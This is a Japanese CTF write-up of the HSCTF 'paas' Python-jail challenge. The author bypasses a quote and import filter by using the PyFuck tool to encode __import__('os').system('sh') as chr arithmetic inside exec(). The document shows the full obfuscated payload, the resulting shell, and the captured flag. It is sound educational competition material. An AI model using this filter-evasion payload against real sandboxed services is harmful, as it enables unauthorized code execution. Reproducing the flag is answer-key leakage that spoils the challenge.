# paas:miscellaneous:347pts
Run Python code from anywhere! `nc paas.hsctf.com 1337`

# Solution
接続先が渡されるが、ソースはない。  
PyJail問のようだ。  
接続していろいろと試してみる。  
```bash
$ nc paas.hsctf.com 1337
== proof-of-work: disabled ==
Python as a Service:
Execute arbitrary Python code (with certain restrictions)
> 1+1
2
> import os
Illegal characters
> print("hack")
Illegal characters
> print('hack')
Illegal characters
> exec()
exec expected at least 1 argument, got 0
> eval()
eval expected at least 1 argument, got 0
```
`"`や`'`は禁止されており、`import`もできないようだ。  
`exec`や`eval`が許されているので、`chr`で文字列を渡すことができる。  
自作の[PyFuck](https://github.com/satoki/PyFuck)を用いる。  
```bash
$ git clone https://github.com/satoki/PyFuck.git
~~~
$ cd PyFuck/
$ echo '__import__("os").system("sh")' > sh.py
$ python pyfuck.py
 ____        _____           _
|  _ \ _   _|  ___|   _  ___| | __
| |_) | | | | |_ | | | |/ __| |/ /
|  __/| |_| |  _|| |_| | (__|   <
|_|    \__, |_|   \__,_|\___|_|\_\
       |___/
                                    by satoki, xryuseix

FileName: sh.py
-> output.py
$ cat output.py
exec(chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(111+1)+chr(111)+chr(111+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1)+chr(111)+chr(111+1+1+1+1)+chr(11+11+11+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(11+11+11+11+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1)+chr(111+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1)+chr(11+11+11+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1))
$ nc paas.hsctf.com 1337
== proof-of-work: disabled ==
Python as a Service:
Execute arbitrary Python code (with certain restrictions)
> exec(chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(111+1)+chr(111)+chr(111+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1)+chr(111)+chr(111+1+1+1+1)+chr(11+11+11+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(11+11+11+11+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1)+chr(111+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1)+chr(11+11+11+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1))
ls
flag
paas.py
cat flag
flag{vuln3r4b1l17y_45_4_53rv1c3}
```
生成されたPyFuckを実行するとシェルが得られ、ファイルにflagが書かれていた。  

## flag{vuln3r4b1l17y_45_4_53rv1c3}